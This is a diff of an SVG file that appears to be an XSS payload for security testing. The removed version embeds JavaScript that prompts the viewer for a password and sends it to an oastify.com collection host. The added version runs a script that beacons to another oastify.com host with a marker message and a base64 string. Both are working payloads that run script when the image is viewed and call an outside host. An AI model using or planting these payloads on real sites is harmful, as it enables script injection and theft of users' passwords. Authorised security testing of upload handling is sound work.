@@ -1,12 +1,19 @@
 <?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
-<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="300" height="200">
+  <script type="text/javascript">
+    <![CDATA[
+      // Trigger HTTP GET request to Burp Collaborator
+      var i = new Image();
+      i.src = 'http://z88oaytd0j2o7a3i8fzid3ifn6t7h95y.oastify.com/?msg=svg-executed';
 
-        <script>
-                var passwd = prompt("Enter your password to continue");
-                var xhr = new XMLHttpRequest();
-                xhr.open("GET","https://s2vh4rn6ucwh13xb28tb7wc8hzn0b1zq.oastify.com/log.php?password="+encodeURI(passwd));
-                xhr.send();
-        </script>
+      // Optional: include a short dummy base64 chunk
+      var fakeData = btoa("<html><h1>SVG Executed</h1></html>");
+      var i2 = new Image();
+      i2.src = 'http://z88oaytd0j2o7a3i8fzid3ifn6t7h95y.oastify.com/?b64=' + fakeData;
+    ]]>
+  </script>
 
-</svg> 
+  <text x="10" y="20" font-size="14">SVG Execution Test</text>
+</svg>
